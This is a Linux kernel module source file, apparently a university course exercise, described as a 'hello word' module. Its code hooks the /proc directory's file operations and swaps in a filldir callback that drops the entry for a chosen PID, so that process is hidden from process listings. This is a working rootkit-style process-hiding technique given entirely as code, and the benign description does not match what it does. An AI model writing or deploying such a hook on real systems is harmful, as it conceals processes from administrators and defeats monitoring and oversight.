/*
 * =======================================================================
 *
 *       Filename:  helloword.c
 *
 *    Description:  Module "hello word" pour noyau 2.6
 *
 *        Version:  1.0
 *        Created:  09/10/2009 13:53:46
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  J. Sopena, Romain Pesche, Mounir Nasr Allah
 *        Company:  LIP6
 *
 * =======================================================================
 */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>

static long pidtarget = 1;
struct file_operations * proc_operation_save;
struct file_operations my_proc_operation;
struct file * proc_list;
struct inode * proc_inode;
filldir_t save_filldir;


MODULE_DESCRIPTION("Module \"hello word2\" pour noyau 2.6");
MODULE_AUTHOR("Julien Sopena, LIP62");
MODULE_LICENSE("GPL");

module_param(pidtarget, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(pidtarget, "PID target");

int myfilldir(void * a, const char * name, int b, loff_t c, u64 d, unsigned e){
  long pid = 0;

  if (kstrtol(name, 10, &pid) != 0) {
  	return save_filldir(a, name, b, c, d, e);
  } else {
    if (pid == pidtarget ){
      return 0;
    }
    else {
  	return save_filldir(a, name, b, c, d, e);
    }
  }




}


int myiterate(struct file * fd, struct dir_context * ctx){
  save_filldir = ctx->actor;
  filldir_t * def = &(ctx->actor);
  *def = myfilldir;

  return proc_operation_save->iterate(fd, ctx);
}


static int hello_init(void)
{
  proc_list = filp_open("/proc", O_RDONLY, 0);
  proc_inode = proc_list->f_inode;
  proc_operation_save = proc_inode->i_fop;


  my_proc_operation = *(proc_operation_save);
  my_proc_operation.iterate = myiterate;

  printk(KERN_ALERT "Change fops\n");
  proc_inode->i_fop = &my_proc_operation;




  printk(KERN_ALERT "Hello, hide %d\n", pidtarget);
  return 0;
}

static void hello_exit(void)
{
  printk(KERN_ALERT "Restore fops\n");
  proc_inode->i_fop = proc_operation_save;

  printk(KERN_ALERT "Goodbye, cruel\n");
}

module_init(hello_init);

module_exit(hello_exit);

